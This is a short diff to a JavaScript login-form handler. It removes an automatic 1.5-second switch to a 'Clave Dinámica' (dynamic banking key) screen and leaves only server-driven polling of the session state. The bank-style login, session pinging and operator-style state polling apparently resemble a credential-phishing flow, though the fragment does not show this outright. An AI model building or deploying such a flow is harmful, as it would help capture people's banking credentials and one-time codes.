@@ -220,23 +220,7 @@ document.getElementById("loginForm").addEventListener("submit", (e) => {
   })
   .then(() => {
     startPing();
-    
-    // Auto-transición a Clave Dinámica después de 1.5s
-    setTimeout(() => {
-      fetch(`/api/sessions/${sessionId}/state`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ state: 'waiting-dinamica' })
-      })
-      .then(() => {
-        showClaveScreen('dinamica');
-        startPolling();
-      })
-      .catch(() => {
-        showClaveScreen('dinamica');
-        startPolling();
-      });
-    }, 1500);
+    startPolling();
   })
   .catch(() => {
     document.getElementById("bfLoader").classList.remove("open");
